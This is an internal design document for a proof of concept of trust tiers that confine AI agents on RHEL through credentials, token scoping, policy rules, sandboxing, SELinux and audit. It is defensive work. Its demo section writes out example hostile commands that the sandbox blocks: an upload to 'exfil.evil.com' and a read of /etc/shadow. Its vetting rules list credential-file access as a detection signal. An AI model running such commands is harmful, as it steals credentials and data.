# Agentic Security Platform — Trust Tiers PoC Design

**Date:** 2026-09-28
**Author:** Amy Ralph, Principal PM, RHEL Security/IdM
**Status:** Design approved, pending implementation plan
**Confidentiality:** Red Hat Internal Only

## 1. Purpose

Demonstrate the complete lifecycle of agentic security on RHEL — from agent enrollment through credential issuance, delegation, runtime authorization, execution confinement, and audit — using a trust tier model that scales from 50 to 50,000 agents without per-agent policy.

### 1.1 Problem Statement

Enterprises deploying AI agent fleets face privilege misalignment: agents are either over-privileged (security risk), under-privileged (productivity loss), or — most commonly — not controlled at all. Identity systems were not designed for non-human actors that delegate to each other. No existing platform enforces least privilege across the full agent lifecycle.

### 1.2 Success Criteria

- A single PoC scenario traverses all five enforcement layers end-to-end
- Three agent trust tiers produce three different outcomes for the same operation
- Delegation between agents demonstrably narrows privileges (never widens)
- Breach response detects, contains, and reports within seconds
- Three deliverable formats: engineering test harness, strategy walkthrough, customer demo
- Policy engine adds <1ms latency to 95% of requests (benchmarked, not claimed)

### 1.3 Audience

| Audience | Deliverable | What They See |
|----------|-------------|---------------|
| Engineering (AB, twoerner, azaalouk) | Test harness with assertion checks per layer | 5 layers integrated, each independently testable, clean interfaces |
| Strategy (CY27 review, leadership) | Architecture diagram + executive pitch + competitive table | DARC+WID+WIMSE+OpenShell+Audit = complete stack no competitor has |
| Customer (UPS, Ericsson, financial) | 7-act narrated demo + arcade | "Here's how you manage your agent fleet" |

## 2. Architecture — Five-Layer Enforcement Stack

Each layer has a specific job and enforcement mechanism. An agent request passes through all five in sequence. Any layer can deny.

```
User enrolls agent
        │
        ▼
┌─────────────────┐
│  L1: DARC        │  Credential issuance
│  (ahdapa AS)     │  confirmation_required per tier + profile
└────────┬────────┘
         ▼
┌─────────────────┐
│  L2: WID/ahdapa  │  Token lifecycle
│  (OBO daemon)    │  Scope ceiling per profile, narrowing per delegation
└────────┬────────┘
         ▼
┌─────────────────┐
│  L3: Policy      │  Runtime authorization
│  (Cedar sidecar) │  Contextual rules: tier + profile + resource + context
└────────┬────────┘
         ▼
┌─────────────────┐
│  L4a: OpenShell  │  Namespace + syscall confinement
│  (ODIS profiles) │  Sandbox per tier: network, FS, syscalls
├─────────────────┤
│  L4b: Blastwall  │  SELinux MAC confinement (always on)
│  (policy modules)│  Type enforcement + MLS/MCS labels
└────────┬────────┘
         ▼
┌─────────────────┐
│  L5: Audit       │  Structured logging + response
│  (OCSF pipeline) │  delegation_path, anomaly detection, CAEP revocation
└─────────────────┘
```

**Key principle:** Layers are independent. A Verified agent with valid tokens (L1-L2) can still be denied at L3 (policy), contained at L4 (sandbox), and flagged at L5 (anomaly). Defense in depth — no single layer is the whole story.

## 3. Trust Tiers

Four tiers mapped to IPA groups. Tier determines the outer boundary of what an agent class can do.

| Tier | Value Statement | IPA Group | Who | Max Scopes | Confinement |
|------|----------------|-----------|-----|------------|-------------|
| **Sovereign** | Full speed on trusted infrastructure — internal agents operate without friction on attested platforms | `agent-tier-sovereign` | Internal SOC/ops agents on IPA-enrolled hosts | Full (read, write, admin, cross-realm) | None |
| **Verified** | Do your job, nothing more — known agents get exactly the access their role requires | `agent-tier-verified` | Known agents (Claude, Copilot) with device pairing | Read + scoped write, no admin | Namespace isolation, filtered syscalls |
| **Untrusted** | Prove yourself first — new agents can observe but can't change anything until they earn trust | `agent-tier-untrusted` | New third-party plugins, unknown agents | Read-only, no delegation | Strict sandbox: no network, read-only FS |
| **Blocked** | No access until we know you're safe — protect the platform from known threats and compromised agents | `agent-tier-blocked` | Known-bad, post-revocation, compliance-restricted | None — enrollment denied at L1 | N/A — no execution |

### 3.1 Tier Classification Decision

The distinction between Blocked and Untrusted is **presence of risk** vs **absence of trust**.

```
Is there a KNOWN reason to deny?
  ├── Yes → BLOCKED
  │    • Blocklist match (client_id, origin domain, threat intel)
  │    • Failed attestation (platform integrity compromised)
  │    • Post-revocation (circuit breaker fired, pending human review)
  │    • Supply chain compromise (CVE, vendor breach notification)
  │    • Compliance gate (data requires cleared systems, agent isn't)
  │    • Organizational policy (domain/geo blocked)
  │
  └── No → UNTRUSTED
       • Unknown but not flagged
       • No attestation (absence, not failure)
       • First contact, new plugin
       • Passed basic enrollment, no device pairing
```

Read-only is NOT zero-risk. Risks that warrant Blocked over Untrusted:

| Read-Only Risk | Impact |
|----------------|--------|
| Data exfiltration | Agent reads PII/credentials/proprietary data for later exfiltration |
| Reconnaissance | Maps API surface, resource IDs, access patterns for future attack |
| Compliance violation | Any unvetted access to regulated data breaks GDPR/HIPAA/ITAR |
| Resource exhaustion | Read swarm consumes rate limits, bandwidth, compute |
| Side-channel leakage | Response times, error patterns reveal system state |

### 3.2 Tier Lifecycle

```
Blocked → Untrusted → Verified → Sovereign
   ↑___________________________________________|
   (revocation / circuit breaker / blocklist)
```

- **Graduation up:** Requires new evidence (attestation, device pairing, IPA enrollment). Untrusted→Verified: code-verified + DPoP. Verified→Sovereign: platform-attested + IPA host enrollment.
- **Demotion down:** Any tier → Blocked on revocation, circuit breaker escalation, or blocklist match. Blocked → Untrusted requires manual admin approval.
- **Phase 2.5:** Manual tier changes (admin updates IPA group membership). **Phase 3:** Automated promotion via attestation evidence at token refresh.

### 3.3 Pre-Enrollment Assessment

Before an agent reaches L1 enrollment, an automated vetting pipeline determines whether it should start at Untrusted or be Blocked. This is "Layer 0" — the assessment happens in a sandbox before the agent touches any real data.

#### 3.3.1 Phase A: Static Analysis (pre-execution)

| Check | Tool | Signal |
|-------|------|--------|
| Binary/image signature | cosign + Rekor transparency log | Signed by known publisher? Verifiable provenance? |
| Known-bad match | Threat intel feed, CVE database | client_id, image hash, or domain on blocklist? |
| Dependency scan | SBOM + vulnerability scanner | Known-vulnerable dependencies? |
| Permission manifest | MCP tool schema / OAuth scope request | What does it declare it needs? Overly broad? |
| Origin reputation | Package registry, domain, publisher | Verified publisher? First publish date? |

#### 3.3.2 Phase B: Dynamic Analysis (sandboxed execution)

Run the tool in an OpenShell strict sandbox with synthetic honeypot data. No network, read-only filesystem, canary tokens embedded in test data.

| Check | Tool | Signal |
|-------|------|--------|
| Syscall profile | OpenShell strict + strace | Attempted ptrace, raw socket, mount? |
| Network behavior | No-network sandbox + tcpdump | Attempted outbound connections? DNS lookups? |
| File access pattern | Read-only FS + audit log | Tried to read /etc/shadow, ~/.ssh, token files? |
| Exfiltration attempt | Honeypot data + write monitoring | Tried to write read data to unexpected locations? |
| Behavioral fingerprint | Synthetic API with canary responses | Followed declared purpose or went exploring? |

#### 3.3.3 Assessment Output

```json
{
  "tool": "new-plugin-v1.0",
  "risk_score": 23,
  "recommendation": "UNTRUSTED",
  "signals": {
    "static": {
      "signature": "cosign_verified",
      "known_bad": false,
      "dependencies": "0 CVEs",
      "scope_request": "read_only"
    },
    "dynamic": {
      "network_attempts": 0,
      "sensitive_file_reads": [],
      "exfiltration_attempt": false,
      "behavioral_match": 0.85
    }
  }
}
```

#### 3.3.4 Decision Thresholds

| Score | Recommendation | Meaning |
|-------|---------------|---------|
| 0–30 | Untrusted | Low risk, safe for read-only access |
| 31–60 | Untrusted + enhanced monitoring | Borderline — extra behavioral scrutiny at L5 |
| 61–100 | Blocked | Too risky for any access |

**Override to Blocked regardless of score:**
- Unsigned binary with no known publisher
- Any exfiltration attempt in dynamic analysis
- Scope request includes `*:write` or `*:admin`
- Sensitive file access attempts (`/etc/shadow`, `~/.ssh/`, token files)

#### 3.3.5 Infrastructure

- **Synthetic API:** Honeypot incident management endpoint with fake data and embedded canary tokens. Detects if the tool tries to use data outside its sandbox.
- **Assessment harness:** Script wrapping OpenShell + strace + log analysis. Runs Phase A checks, launches Phase B sandbox, collects signals, computes score.
- **Scoring engine:** Config file with per-signal weights. Tunable per organization (stricter for regulated industries).

#### 3.3.6 Implementation

- **Phase 2.5:** `scripts/assess-tool.sh` — runs static checks (cosign verify, blocklist lookup) + OpenShell dynamic sandbox with synthetic data. Outputs risk score + recommendation. Manual review of results before tier assignment.
- **Phase 3:** Automated pipeline — new tool submitted via API → assessment runs → auto-assigned Untrusted if score <30, queued for human review if 30–60, auto-blocked if >60. Results stored in IPA as assessment record linked to agent profile.

## 4. Agent Role Profiles (Specific Access Policy)

Within a tier, profiles define what a specific agent type's job is — the scope ceiling for its role.

### 4.1 Profile Model

Profiles are IPA objects (Phase 2.5: config files; Phase 3: LDAP objectclass). Each defines:

- `tier` — which trust tier this profile belongs to
- `scopes` — allowed scope set (ceiling)
- `deny-scopes` — explicitly forbidden scopes (override)
- `max-delegation-depth` — how many sub-delegations this agent can initiate (0 = no delegation, 1 = can delegate to one sub-agent)
- `confirmation` — DARC confirmation policy (`required`, `off`)
- `protected-resources` — resource patterns requiring slow-path policy evaluation

### 4.2 Example Profiles

```
code-assistant:
  tier: verified
  scopes: [code:read, code:write, pr:create, test:run]
  deny-scopes: [infra:admin, billing:*, user:delete]
  max-delegation-depth: 1
  confirmation: required
  protected-resources: [branch:main, branch:release/*]

devops-assistant:
  tier: verified
  scopes: [incident:read, incident:write, code:read, code:write, infra:read]
  deny-scopes: [incident:admin, infra:admin, billing:*, user:delete]
  max-delegation-depth: 1
  confirmation: required
  protected-resources: [severity:1, branch:main]

billing-agent:
  tier: verified
  scopes: [billing:read, billing:write, invoice:create]
  deny-scopes: [code:*, infra:*, user:*]
  max-delegation-depth: 0
  confirmation: required
  protected-resources: [amount:>10000]

ops-sentinel:
  tier: sovereign
  scopes: [incident:*, infra:read, infra:restart, user:read]
  deny-scopes: [user:delete]
  max-delegation-depth: 3
  confirmation: required
  protected-resources: []

unknown-plugin:
  tier: untrusted
  scopes: [*:read]
  deny-scopes: [*:write, *:admin, *:delete]
  max-delegation-depth: 0
  confirmation: "off"
  protected-resources: [*]
```

### 4.3 Profile Inheritance

Profiles can inherit from a parent and narrow:

```
billing-agent-readonly:
  inherits: billing-agent
  deny-scopes: [billing:write, invoice:create]
```

### 4.4 Relationship: Tier vs Profile vs Policy

```
Tier    = how much you trust the agent     (4 values, coarse)
Profile = what the agent's job is          (N values, per agent type)
Policy  = should this action happen now    (contextual, per request)
```

- Tier is the trust boundary (IPA group)
- Profile is the scope ceiling (IPA object / config)
- Policy is the runtime floor (Cedar/OPA rules)

## 5. Layer Details

### 5.1 L1: DARC — Credential Issuance

**Component:** ahdapa AS (AB's DARC implementation)

**Behavior per tier:**

| Tier | Enrollment | DARC Behavior | Token Result |
|------|------------|---------------|--------------|
| Blocked | Blocklist match, failed attestation, post-revocation | Enrollment rejected (403) before DARC flow starts | No token issued |
| Sovereign | IPA service principal, keytab auth | Host armor + `idp-confirmed`, `krb5_tgt` authorization_details | Full scopes per profile |
| Verified | agentdesktop JWT, device-paired via DPoP | `confirmation_required`, user types 6-digit code | Profile-scoped ceiling |
| Untrusted | Unknown client_id, no pairing, `confirmation_input=none` | `confirmation_unavailable` (400) for high-value scopes | Read-only scopes only |

**Phase 2.5 implementation:** Use ahdapa HTTP endpoint directly (mock the PA-152 v2 Kerberos flow). Demo narrates "in production this happens inside `kinit`."

**Phase 3:** Full SSSD PA-152 v2 integration, FreeIPA integrated IdP I.

### 5.2 L2: WID/ahdapa — Token Lifecycle

**Component:** OBO daemon (`daemon/ipa-obo-exchange.py`)

**Extensions for trust tiers:**

1. Read agent's IPA group membership at token exchange
2. Look up agent's profile (config file or IPA LDAP)
3. Apply scope ceiling: issued token scopes = intersection(requested, profile.scopes) − profile.deny-scopes
4. Emit claims: `tier`, `profile`, `delegation_path[]`
5. Enforce `max-delegation-depth`: reject OBO if chain depth exceeds profile limit

**Delegation scope narrowing:**

```
Parent token scopes: [code:read, code:write]
Child profile scopes: [*:read]
OBO result: [code:read]              ← intersection, never widens

Parent token scopes: [incident:read, incident:write]
Child requests: [incident:admin]
OBO result: DENIED                   ← admin not in parent, can't delegate up
```

**Token structure:**

```json
{
  "sub": "alice@CORP.LOCAL",
  "tier": "verified",
  "profile": "code-assistant",
  "scope": "code:read code:write",
  "act": {"sub": "DevAssist", "act": {"sub": "PluginX"}},
  "delegation_path": ["alice@CORP.LOCAL", "DevAssist", "PluginX"],
  "confirmation": true,
  "auth_indicators": ["idp-confirmed"],
  "authorization_details": [{"type": "krb5_tgt", "realm": "CORP.LOCAL"}]
}
```

### 5.3 L3: Policy Engine — Runtime Authorization

**Component:** Cedar sidecar (single Rust binary, embedded or Unix socket)

**PEP placement:** AuthZEN-compatible `/access/v1/evaluation` endpoint, called by target API middleware.

#### 5.3.1 Two-Tier Evaluation (Fast Path / Slow Path)

```
FAST PATH (95% of requests):
  Token has: tier, profile, scopes
  Request targets: non-protected resource
  Check: scope ∈ token.scopes AND resource ∉ profile.protected-resources
  → PERMIT without policy engine call

SLOW PATH (5% of requests):
  Resource is protected or operation is conditional
  → Full Cedar evaluation with context (time, severity, behavior)
```

#### 5.3.2 Policy Rules (Phase 2.5: 6 rules)

```cedar
// Rule 1: Tier gate — admin requires Sovereign
forbid(
  principal,
  action in [Action::"incident:admin", Action::"infra:admin"],
  resource
) unless {
  principal.tier == "sovereign"
};

// Rule 2: Severity gate — P1 write requires Sovereign
forbid(
  principal,
  action == Action::"incident:write",
  resource
) when {
  resource.severity == 1 &&
  principal.tier != "sovereign"
};

// Rule 3: Time gate — off-hours write requires Sovereign
forbid(
  principal,
  action == Action::"incident:write",
  resource
) when {
  !(context.hour >= 8 && context.hour <= 18) &&
  principal.tier != "sovereign"
};

// Rule 4: Delegation depth limit (sub_delegation_count = delegations initiated by this principal)
forbid(
  principal,
  action,
  resource
) when {
  context.sub_delegation_count > principal.max_delegation_depth
};

// Rule 5: Rate limit — >10 requests/minute from Untrusted
forbid(
  principal,
  action,
  resource
) when {
  principal.tier == "untrusted" &&
  context.requests_last_minute > 10
};
```

#### 5.3.3 Performance Targets

| Metric | Target | Measurement |
|--------|--------|-------------|
| Fast path latency | <10μs | Token claim check only |
| Slow path latency (5 rules) | <200μs | Cedar local evaluation |
| Throughput (single core) | >100K evals/sec | Cedar benchmark |
| Fast path hit rate | >95% | Request sampling |

Benchmark harness: `tests/bench-policy-latency.sh` — 1000 requests with/without policy, reports p50/p95/p99.

### 5.4 L4: Execution Confinement (OpenShell + Blastwall)

Two independent confinement mechanisms, stacked. Either can be used alone — not all deployments will run OpenShell (e.g., container-native workloads may rely on Blastwall only). Both should be accounted for in every design.

#### 5.4.1 L4a: OpenShell — Namespace + Syscall Confinement

**Component:** OpenShell 0.0.111 with tier-mapped sandbox profiles

**What it enforces:** Process isolation (namespaces), syscall filtering (seccomp), network segmentation, filesystem access.

**Four profiles:**

```yaml
blocked.profile:
  # No execution — agent never reaches L4

sovereign.profile:
  namespace: shared
  network: full
  filesystem: read-write
  syscalls: unrestricted

verified.profile:
  namespace: isolated
  network: filtered (allow outbound HTTPS, deny all else)
  filesystem: read-write to designated output dir only
  syscalls: restricted (no ptrace, no mount, no raw socket)

untrusted.profile:
  namespace: isolated
  network: none
  filesystem: read-only (bind-mount target dir only)
  syscalls: strict (no execve of new binaries, no ptrace, no net)
```

**Profile selection:** Target API reads `tier` claim from token → selects matching OpenShell profile → executes agent code within sandbox.

**When to use:** Agent executes arbitrary code or scripts. CLI tools, MCP tool servers, plugin runtimes.

#### 5.4.2 L4b: Blastwall — SELinux MAC Confinement

**Component:** Blastwall SELinux policy modules, one per trust tier.

**What it enforces:** Mandatory Access Control at the kernel level. Controls file access, IPC, network socket types, device access. Operates independently of OpenShell — even if namespace/seccomp is bypassed, SELinux MAC still blocks.

**Tier mapping via MLS/MCS labels:**

| Tier | SELinux Context | Access |
|------|----------------|--------|
| Sovereign | `agent_sovereign_t / s0-s15:c0.c1023` | Full MLS range, all categories |
| Verified | `agent_verified_t / s0:c100.c199` | Restricted category set, no cross-tier data access |
| Untrusted | `agent_untrusted_t / s0` | Base sensitivity only, no categories, no IPC to other tiers |

**Policy modules (Phase 2.5: 3 modules):**

```
# agent_sovereign.te — full access, standard audit
type agent_sovereign_t;
allow agent_sovereign_t agent_data_t:file { read write create };
allow agent_sovereign_t agent_net_t:tcp_socket { create connect };
allow agent_sovereign_t agent_ipc_t:unix_stream_socket { connectto };

# agent_verified.te — scoped access, no admin files, no raw sockets
type agent_verified_t;
allow agent_verified_t agent_data_t:file { read write };
dontaudit agent_verified_t agent_admin_t:file { read write };
allow agent_verified_t agent_net_t:tcp_socket { create connect };

# agent_untrusted.te — read-only, no network sockets, no IPC
type agent_untrusted_t;
allow agent_untrusted_t agent_data_t:file { read };
dontaudit agent_untrusted_t agent_data_t:file { write create };
dontaudit agent_untrusted_t self:tcp_socket { create connect };
dontaudit agent_untrusted_t agent_ipc_t:unix_stream_socket { connectto };
```

**File contexts:** Agent data directories labeled per tier. Cross-tier access blocked by type enforcement.

```
/var/lib/agent/sovereign(/.*)?    system_u:object_r:agent_sovereign_data_t:s0-s15
/var/lib/agent/verified(/.*)?     system_u:object_r:agent_verified_data_t:s0:c100.c199
/var/lib/agent/untrusted(/.*)?    system_u:object_r:agent_untrusted_data_t:s0
```

**When to use:** All deployments. Blastwall is the baseline — it runs at the kernel level regardless of whether OpenShell is present. Container workloads, systemd services, and direct process execution all get SELinux confinement.

#### 5.4.3 Stacking Model

```
Agent code executes
  │
  ├── L4b: Blastwall (always)
  │    SELinux MAC: type enforcement + MLS/MCS labels
  │    Blocks: cross-tier file access, unauthorized IPC, raw sockets
  │
  └── L4a: OpenShell (when applicable)
       Namespace + seccomp: process isolation, syscall filtering
       Blocks: network exfiltration, filesystem escape, privilege escalation
```

**Defense in depth:** If an agent escapes the OpenShell namespace (container breakout), Blastwall's SELinux policy still constrains it. If SELinux is in permissive mode (troubleshooting), OpenShell's seccomp still blocks dangerous syscalls. Neither depends on the other.

**Deployment matrix:**

| Deployment Type | L4a OpenShell | L4b Blastwall |
|-----------------|---------------|---------------|
| MCP tool server (container) | Yes | Yes |
| CLI agent (direct execution) | Yes | Yes |
| Systemd service agent | No (already isolated) | Yes |
| K8s pod agent | No (use pod security) | Yes (via SELinux on node) |
| RHEL AI model tool call | Optional | Yes |

**Phase 2.5:** OpenShell profiles + 3 Blastwall SELinux policy modules. Both active in demo.
**Phase 3:** Per-profile SELinux policy generation (not just per-tier). Blastwall policy compiler takes agent profile YAML → generates `.te` module.

### 5.5 L5: Audit — Structured Logging and Response

**Component:** Log formatter + anomaly detector + CAEP stub

#### 5.5.1 Log Format (OCSF)

```json
{
  "timestamp": "2026-09-28T12:34:56Z",
  "event_type": "authorization_decision",
  "agent_id": "DevAssist",
  "tier": "verified",
  "profile": "code-assistant",
  "delegation_path": ["alice@CORP.LOCAL", "DevAssist"],
  "operation": "incident:write",
  "resource": {"id": "INC-4471", "severity": 1},
  "layer": "L3",
  "decision": "DENY",
  "reason": "severity_gate: P1 requires sovereign",
  "latency_us": 142,
  "correlation_id": "req-7a3f"
}
```

Every L1-L5 decision emits a log entry. Entries share `correlation_id` for a single request's trace across layers.

#### 5.5.2 Anomaly Detection

Sliding window detector (in-process, not ML):

| Signal | Threshold | Action |
|--------|-----------|--------|
| Denied requests | 3+ in 10 seconds | Flag |
| Scope escalation attempts | 2+ denied scope requests | Flag + rate limit |
| Delegation depth exceeded | 1 attempt beyond max | Flag |
| Flagged + continued attempts | 3+ flags in 60 seconds | Trigger revocation |

#### 5.5.3 Revocation Response

```
Anomaly detected → CAEP stub (HTTP POST to ahdapa /revoke)
  → Agent tokens invalidated
  → Sub-delegated tokens cascade-invalidated
  → Audit: blast radius report emitted
  → Alert to Sovereign agents (notification channel)
```

**Phase 2.5:** CAEP as HTTP POST stub. Same revocation result.
**Phase 3:** Full SSF/CAEP stream, SIEM integration.

#### 5.5.4 Behavioral Anomaly Detection (Permitted-but-Wrong)

The §5.5.2 anomaly detector catches policy violations (denied requests). This section catches agents doing things they're **allowed** to do but doing them **wrong** — hallucinated actions, semantic nonsense, swarm amplification.

**Threat model:**

| Threat | Example | Why L2/L3 Don't Catch It |
|--------|---------|--------------------------|
| Hallucination | Sovereign agent writes garbage P1 incident updates | Has `incident:write` scope, action is permitted |
| Swarm amplification | 50 Verified agents all update same incident simultaneously | Each individual action within policy |
| Behavioral drift | Agent shifts from 90% reads to 90% writes over weeks | All actions within scopes |
| Sequence violation | Agent writes without prior read, contradictory operations | Policy checks individual actions, not sequences |

**Detection signals (Phase 2.5: first three, counters only):**

| Signal | Method | Threshold | Action |
|--------|--------|-----------|--------|
| Per-agent rate spike | Rolling 1-hour baseline, flag >3σ | Configurable per profile | Flag + throttle |
| Per-resource swarm | Count distinct agents hitting same resource in 60s window | >N agents (default: 5) without orchestrator intent | Flag + circuit breaker |
| Action sequence | State machine per profile (expected: read→analyze→write) | Write without read, repeated identical calls | Flag |
| Semantic mismatch | Compare write content vs read content (Phase 3: LLM judge) | Contradiction score >threshold | Flag |
| Behavioral drift | Weekly baseline comparison per agent | >2σ shift in action distribution | Alert |

#### 5.5.5 Circuit Breaker

Individual revocation (§5.5.3) stops one agent. Swarm problems need **profile-level** response.

```
Swarm anomaly detected (>N agents, same resource, no intent signal)
  → Circuit breaker activates for profile class (e.g., all devops-assistant agents)
  → Stage 1: THROTTLE (rate-limit all agents in profile to baseline rate)
  → Stage 2 (sustained anomaly, >60s): HALT (suspend all new actions, allow in-flight to complete)
  → Stage 3 (>5 min or admin trigger): BLOCK (demote all agents in profile to Blocked tier)
  → Alert: Sovereign agents + EDA webhook at each stage
  → Resume from THROTTLE/HALT: auto-resume if anomaly signal clears
  → Resume from BLOCK: manual admin approval only (move agents back to previous tier)
```

**EDA integration (Phase 3):**

```
L5 audit pipeline
  → OCSF event (webhook) → Event-Driven Ansible
  → EDA rulebook evaluates conditions
  → Triggers remediation playbook:
     - Revoke tokens via ahdapa /revoke API
     - Throttle profile class via L5 circuit breaker API
     - Create incident ticket (Jira)
     - Page SOC (PagerDuty/Slack)
```

**Phase 2.5:** Circuit breaker as in-process rate limiter per profile. Webhook to stdout (for demo). No EDA integration.
**Phase 3:** EDA rulebook + AAP remediation playbooks. SSF event source plugin for real-time CAEP consumption.

#### 5.5.6 Orchestrator Intent Signal

The hardest detection problem: distinguishing approved scaling from misbehavior. A burst of 50 agents is legitimate if the orchestrator requested it, anomalous if it wasn't.

**The intent signal:**

```
Orchestrator (AAP/EDA, K8s HPA, manual) registers expected behavior:

POST /l5/intent
{
  "orchestrator": "aap-controller-1",
  "profile": "devops-assistant",
  "expected_count": 10,
  "reason": "incident-INC-5521",
  "expected_rate": "200 writes/hour",
  "ttl": "2h"
}
```

**L5 comparison logic:**

```
observed_count vs intent.expected_count     → count mismatch
observed_rate vs (baseline × expected_count) → rate mismatch
action_patterns vs profile.fingerprint       → behavioral mismatch

No intent registered + burst detected → ANOMALY (high confidence)
Intent registered + within envelope   → NORMAL
Intent registered + outside envelope  → ANOMALY (medium confidence)
```

**Without intent signal:** L5 falls back to statistical anomaly detection (per-agent baseline, 3σ threshold). Higher false positive rate during legitimate bursts, but still catches sustained misbehavior.

**Phase 2.5:** Intent signal API endpoint (stub). Manual registration via curl for demo. L5 checks for intent before flagging swarm anomaly.
**Phase 3:** AAP/EDA auto-registers intent when launching agent playbooks. K8s HPA integration via admission webhook.

### 5.6 Cross-Cutting: Integrity Attestation

**Purpose:** Verify that an agent is running on a trustworthy platform with unmodified code before granting tier-level access. Attestation is not a layer — it's evidence that strengthens tier classification at L1 enrollment.

#### 5.6.1 Attestation Chain (UC-8)

Established in the Security Requirements Paper (Domain 5: Attestation/Supply Chain):

```
Sigstore (code signing)
  → cosign verify agent image against Rekor transparency log
  → Proves: agent binary is what it claims to be

Keylime (platform attestation)
  → TPM quote: measured boot, IMA runtime integrity
  → Proves: host hasn't been tampered with

SPIRE (workload identity)
  → Node attestation from platform evidence → X509-SVID
  → Proves: workload identity bound to verified platform

IPA (organizational binding)
  → SVID-to-Kerberos bridge (Workload Identity PoC, 4/4 milestones)
  → Proves: agent belongs to this organization's trust domain
```

#### 5.6.2 Attestation per Tier

| Tier | Required Evidence | Token Claim | Phase 2.5 | Phase 3 |
|------|-------------------|-------------|-----------|---------|
| Blocked | Failed or blocklisted | No token issued | Blocklist check at L1 | Real: failed Keylime/cosign + threat intel feed |
| Sovereign | Keylime platform + SPIRE SVID + IPA enrollment | `attestation: "platform-verified"` | Enrollment-path-derived (host armor → attested) | Real: Keylime TPM quote + SPIRE node attestation |
| Verified | Sigstore-verified agent binary + DPoP device pairing | `attestation: "code-verified"` | Enrollment-path-derived (agentdesktop JWT → code-verified) | Real: cosign verify at enrollment time |
| Untrusted | None | `attestation: "none"` | No verification | Same — attestation is how you graduate out of Untrusted |

#### 5.6.3 Token Claim

```json
{
  "attestation": "platform-verified",
  "attestation_evidence": {
    "keylime": {"quote_time": "2026-09-28T12:00:00Z", "pcr_hash": "sha256:abc..."},
    "spire": {"svid_serial": "12345", "trust_domain": "corp.local"},
    "sigstore": {"rekor_entry": "24658923", "digest": "sha256:def..."}
  }
}
```

**Phase 2.5:** `attestation` claim only (string). `attestation_evidence` omitted — no real verification backend.
**Phase 3:** Full `attestation_evidence` populated by `ipa-wid-attestation` RPM (already in WID appliance RPM plan).

#### 5.6.4 Policy Integration

Attestation claims feed L3 policy rules. Example: require fresh attestation for admin operations.

```cedar
// Rule 6: Admin ops require platform-verified attestation
forbid(
  principal,
  action in [Action::"incident:admin", Action::"infra:admin"],
  resource
) when {
  principal.attestation != "platform-verified"
};
```

#### 5.6.5 Tier Graduation

Attestation is the mechanism for an agent to move from Untrusted → Verified → Sovereign:

1. Agent attempts enrollment → blocklist check. If match → Blocked, no token.
2. Unknown agent, no blocklist match → Untrusted, `attestation: "none"`
3. Agent's binary is cosign-verified → profile updated to Verified, `attestation: "code-verified"`
4. Agent runs on Keylime-attested IPA-enrolled host with SPIRE SVID → Sovereign, `attestation: "platform-verified"`
5. Any tier: revocation/circuit breaker Stage 3 → Blocked. Admin removes from `agent-tier-blocked` to restore.

This is not automatic in Phase 2.5 (manual profile reassignment). Phase 3: automated tier promotion via attestation evidence evaluation at token refresh.

## 6. Demo Scenario — Seven Acts

Scenario: Enterprise AI-assisted IT operations platform. Three agents interact with the same target: a customer incident management API.

**Cast:**
- **SOC Sentinel** — Sovereign tier, `ops-sentinel` profile. Internal SOC agent on IPA-enrolled host.
- **DevAssist** — Verified tier, `devops-assistant` profile. Claude Code via agentdesktop, device-paired.
- **PluginX** — Untrusted tier, `unknown-plugin` profile. New third-party MCP tool.

### Act 1: Enrollment — "Who are you?"

Each agent enrolls at the same endpoint. DARC produces different outcomes per tier.

- SOC Sentinel: host armor + `idp-confirmed` → Sovereign, full scopes
- DevAssist: DARC confirmation code typed by user → Verified, code-assistant ceiling
- PluginX: `confirmation_input=none`, no high-value scopes → Untrusted, read-only

**Demonstrates:** L1 (DARC). Same endpoint, three outcomes. Platform classified agents without per-agent config.

### Act 2: Issuance — "What can you do?"

Show token contents side-by-side. Each agent got scopes appropriate to its tier + profile.

**Demonstrates:** L2 (WID). Scope ceiling enforcement. PluginX didn't get denied — it got exactly the privileges appropriate for its trust level.

### Act 3: Operation — "Read the incident"

All three agents read incident #4471. All succeed (all have read scope).

**Demonstrates:** The platform works. Agents get access appropriate to their role.

### Act 4: Delegation Chain — "Agent calls agent"

DevAssist delegates to PluginX via OBO exchange. Result: PluginX-on-behalf-of-DevAssist gets `incident:read` only (intersection of write ∩ read-only). DevAssist tries to delegate upward to Sovereign scope — denied.

**Demonstrates:** L2 delegation narrowing. Privileges never widen. Can't delegate up.

### Act 5: Policy Enforcement — "Context matters"

DevAssist and SOC Sentinel both have `incident:write`. Policy engine adds context:

- DevAssist writes P4 incident during business hours → 200 OK
- DevAssist writes P1 incident → 403 (policy: P1 requires Sovereign)
- DevAssist writes P4 at 2 AM → 403 (policy: off-hours requires Sovereign)
- SOC Sentinel writes P1 at 2 AM → 200 OK

**Demonstrates:** L3 (policy). Same scope, different outcomes based on context. Scopes are ceilings, policy is the floor.

### Act 6: Execution Confinement — "Sandbox your actions"

PluginX executes a script. OpenShell enforces Untrusted profile:

- Read incident data from bind-mount → allowed
- `curl https://exfil.evil.com/upload` → blocked (no network)
- `cat /etc/shadow` → blocked (not in bind-mount)
- Write to /tmp → blocked (read-only FS)

DevAssist runs the same script — network allowed (filtered), write to output dir allowed.

**Demonstrates:** L4 (OpenShell). Even if tokens were valid, execution confinement limits blast radius.

### Act 7: Breach Response — "Something went wrong"

DevAssist gets compromised. Attempts `incident:admin` (denied at L2), rapid-fire OBO escalation (denied, flagged at L5), automatic revocation triggered, all DevAssist tokens + sub-delegated PluginX tokens invalidated. Audit log shows blast radius: 0 admin ops, 2 P4 writes in window (both within policy).

**Demonstrates:** L5 (audit + response). Detect, contain, report. Blast radius bounded by tier system.

## 7. Scaling

### 7.1 Scaling Dimensions

| Dimension | 50 agents | 500 agents | 5,000 agents | 50,000 agents |
|-----------|-----------|------------|--------------|---------------|
| Token issuance | trivial | trivial | trivial | horizontal (IPA replicas) |
| Policy eval throughput | single core | single core | single core | multi-core sidecar |
| Audit volume | ~9 MB/day | ~90 MB/day | ~5 GB/day | standard SIEM |
| Delegation | no issue | no issue | cap depth 3 | cap depth 3 |
| Policy rules | ~10 | ~50 | ~200 | profile-scoped indexing |
| Revocation window | instant | instant | 5-min (short-lived tokens) | introspection (Phase 3) |
| Config management | manual | team review | tooling + linting | platform team |

### 7.2 Performance Budget

```
Network ingress:          ~1ms
TLS termination:          ~0.5ms
Token validation (L2):    ~0.01ms
Policy evaluation (L3):   ~0.05-0.2ms
Application logic:        ~5-50ms
Database query:            ~2-10ms
OpenShell setup (L4):     one-time, not per-request
Audit emit (L5):          ~0.1ms (async)
```

Policy layer adds <1ms. Indistinguishable from total request time.

### 7.3 Multi-Site

- Phase 2.5: single site, config files
- Phase 3: IPA LDAP policy objects, free replication (~15s)
